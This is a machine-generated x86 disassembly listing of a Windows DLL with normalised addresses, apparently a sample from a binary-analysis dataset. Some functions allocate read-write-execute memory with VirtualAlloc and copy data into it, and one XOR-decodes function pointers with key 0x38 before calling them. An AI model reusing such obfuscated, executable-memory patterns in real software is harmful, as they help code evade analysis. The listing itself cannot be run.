lea edx [ ebp - 0x84 ]
mov [ ebp - 0x84 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x84 ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0xd1
call sub_1000a6f0
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x88 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x88 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x95
lea edx [ ebp - 0x8c ]
mov [ ebp - 0x8c ] ebx
call sub_10061250
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x84 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x8c ]
mov eax [ ebp - 0x90 ]
push esi
add eax 0x128
call sub_10068440
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0xe9
jmp r-xdata
mov eax [ ebp - 0x88 ]
cmp eax ebx
je r-xdata
call sub_10020880
jmp r-xdata
call sub_1000a6f0
sub_1004763e
push 0x38
mov eax sub_1007e8a6
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10010e0d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10045daa
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1004770a
push 0x64
mov eax sub_1007e708
call sub_10007703
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_10018820
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1002a674
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x38 ] eax
je r-xdata
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] edi
call sub_1005e05a
add esp 0xc
push [ ebp - 0x5c ]
movzx ebx ax
mov eax [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_10060ea7
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2b
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc eax
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1001e1ec
mov [ ebp - 0x6c ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x60 ]
push eax
call sub_10030239
mov edi [ ebp - 0x54 ]
push [ ebp - 0x6c ]
mov [ edi ] al
movsx eax al
push eax
push r--data
call sub_100783e0
add esp 0x14
test eax eax
je r-xdata
mov ecx esi
call sub_1001e1bc
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
mov eax [ ebp - 0x64 ]
push [ ebp - 0x5c ]
add eax 0x1f
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x70 ] eax
call sub_10060ea7
test al al
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x54 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x8
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
xor ebx ebx
push ebx
push 0x78
call sub_1005e05a
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp edi [ ebp - 0x70 ]
jae r-xdata
cmp [ edi ] 0x30
je r-xdata
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_1001c5c0
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov eax [ ebp - 0x50 ]
call sub_10019c00
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
mov edi [ ebp - 0x68 ]
test di di
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] bl
call sub_1001e1ec
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] di
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_10047ab0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebx + ebx + 0x2 ]
mov [ ebp - 0x4 ] ebx
cmp esi eax
jge r-xdata
jne r-xdata
mov eax [ edi + esi * 4 - 0x4 ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebx - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp - 0x4 ] ebx
jge r-xdata
mov ecx [ edi + eax * 4 - 0x4 ]
mov [ edi + ebx * 4 ] ecx
lea ebx [ eax - 0x1 ]
mov edx [ edi + esi * 4 ]
mov [ edi + ebx * 4 ] edx
mov ebx esi
lea esi [ esi + esi + 0x2 ]
cmp esi [ ebp + 0x8 ]
jl r-xdata
dec esi
mov edx [ ebp + 0xc ]
mov eax [ edx ]
pop esi
mov [ edi + ebx * 4 ] eax
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp esi eax
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
pop esi
mov [ edi + ebx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + esi * 4 ]
lea eax [ esi - 0x1 ]
mov [ edi + ebx * 4 ] edx
cdq
sub eax edx
mov ebx esi
sar eax 0x1
mov esi eax
cmp [ ebp - 0x4 ] ebx
jl r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
pop esi
mov [ edi + ebx * 4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_10047b65
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_10078ac0
lea esi [ eax + 0x1 ]
push esi
call sub_10062fc5
pop ecx
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov ecx eax
sub ecx edi
mov dl [ edi ]
mov [ ecx + edi ] dl
inc edi
dec esi
jne r-xdata
sub_10047ba0
push ebp
mov ebp esp
sub esp 0x690
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x684 ] ecx
mov [ ebp - 0x68c ] edx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
je r-xdata
xor ecx ecx
test eax eax
setne cl
push ebx
push edi
lea edx [ ebp - 0x688 ]
mov eax 0x3
add ecx 0x80000001
mov [ ebp - 0x690 ] ecx
call sub_100121e0
lea edx [ ebp - 0x680 ]
mov eax 0x1
call sub_100121e0
lea edx [ ebp - 0x67c ]
mov eax 0x5
call sub_100121e0
mov edi [ StrStrW@IAT ]
push edx
push esi
call edi
lea ecx [ ebp - 0x678 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
jmp r-xdata
lea ebx [ ebp - 0x680 ]
xor edi edi
sub ebx ecx
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ edx + 0x2 ]
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x67c ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x5 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
jmp r-xdata
lea eax [ ebp - 0x680 ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x684 ]
lea ecx [ ebp - 0x67c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edi [ StrStrW@IAT ]
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x684 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ ebp - 0x680 ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
je r-xdata
mov eax [ ebp - 0x684 ]
lea edx [ ebp - 0x67c ]
push edx
push eax
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x688 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
je r-xdata
lea ecx [ ebp - 0x680 ]
push ecx
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ ebp - 0x67c ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x60 ]
xor eax eax
call sub_100121e0
mov edx [ ebp - 0x68c ]
push 0x1
push edx
mov edx [ ebp - 0x690 ]
lea ecx [ ebp - 0x678 ]
lea eax [ ebp - 0x60 ]
call sub_10010710
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop ebx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10047f11
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001b271
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10047fb0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_1001c310
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
mov ecx [ esi + 0x90 ]
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
push ecx
push 0x0
mov [ esi + 0x6c ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ edi + 0x94 ]
mov eax [ edi + 0x90 ]
mov ecx [ esi + 0x90 ]
push edx
push eax
push ecx
call sub_10078600
mov edx [ edi + 0x94 ]
mov eax [ esi ]
mov [ esi + 0x94 ] edx
mov edx [ eax + 0x8 ]
add esp 0xc
mov ecx esi
call edx
cmp [ edi + 0x98 ] 0x0
je r-xdata
mov eax [ edi + 0x9c ]
mov [ esi + 0x9c ] eax
mov eax [ edi + 0x9c ]
push 0x40
push 0x3000
push eax
push 0x0
call [ VirtualAlloc@IAT ]
mov [ esi + 0x98 ] eax
mov ecx [ edi + 0x94 ]
mov edx [ edi + 0x98 ]
push ecx
push edx
push eax
call sub_10078600
add esp 0xc
sub_100480a0
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_100616c6
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_1002df60
mov eax esi
cmp eax esi
jae r-xdata
sub_10048120
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x5c
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1001c310
mov eax esi
mov esp ebp
pop ebp
retn
sub_10048150
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
jne r-xdata
call sub_1005eea0
test eax eax
jne r-xdata
call sub_100217d0
test eax eax
jne r-xdata
mov ecx eax
call sub_10042590
test eax eax
je r-xdata
mov eax 0x1
pop ecx
pop ebp
retn
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ rw-data ] 0x1
mov eax 0x2
pop ecx
pop ebp
retn
xor eax eax
pop ecx
pop ebp
retn
sub_1004819e
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10042f0f
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1004b520
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_1004a7e0
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x20
sub_10048260
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push edi
push 0x104
lea eax [ ebp - 0x224 ]
mov edi ecx
mov ecx [ esi + 0x4 ]
push eax
push ecx
call [ ExpandEnvironmentStringsW@IAT ]
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ edi ]
push eax
push ecx
lea eax [ ebp - 0x224 ]
call sub_1000c170
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x61
call sub_1001bb80
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xe0
call sub_1001bb80
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
lea ecx [ ebp - 0x18 ]
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
lea edx [ ebp - 0x1c ]
push edx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
lea ecx [ ebp - 0x1c ]
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
push edi
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_10078600
add esp 0xc
push esi
xor ecx ecx
xor edx edx
call sub_1001f7e0
mov ecx [ ebp - 0x8 ]
xor ecx ebp
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_1004834e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10004e58
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_100483be
push 0x34
mov eax sub_1007e29f
call sub_10050d0f
mov eax [ ebp + 0xc ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100067d1
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_100216c0
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
push 0x3f
push eax
call sub_1004e11d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x40 ]
call sub_10062210
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_1002470e
shl eax 0x2
push eax
call sub_10028397
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
call sub_1001a1b3
retn
mov edi [ esi + 0xc ]
jmp r-xdata
mov edi rw-data
mov esi r--data
test [ rw-data ] bl
jne r-xdata
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x1c ]
call sub_10011e8f
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] esi
call sub_1002050e
or [ rw-data ] ebx
push ebx
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov [ ebp + 0xc ] r--data
call sub_1000a4a8
push sub_10083386
mov [ rw-data ] esi
call sub_10025945
pop ecx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
dec edi
mov ecx [ eax + edi * 4 ]
mov eax [ esi + 0x8 ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
call sub_1001c4b0
sub_100484d0
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
push ebx
push esi
xor eax eax
mov bl 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
push eax
lea edx [ ebp - 0x14 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x14 ] 0xd
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
